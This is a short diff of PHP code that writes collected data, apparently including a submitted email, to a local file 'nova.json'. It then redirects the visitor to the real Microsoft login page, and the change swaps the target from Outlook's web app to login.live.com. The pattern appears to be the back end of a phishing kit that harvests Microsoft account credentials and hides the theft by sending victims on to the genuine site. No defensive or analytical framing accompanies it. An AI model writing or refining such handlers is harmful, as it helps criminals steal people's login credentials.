@@ -26,7 +26,7 @@
          var_dump($final_data);
 
          if(file_put_contents("nova.json", $final_data)){
-            header("location: https://outlook.live.com/owa/");
+            header("location: https://login.live.com/login.srf");
             // header('location: r?email='.$email);
          }
       }
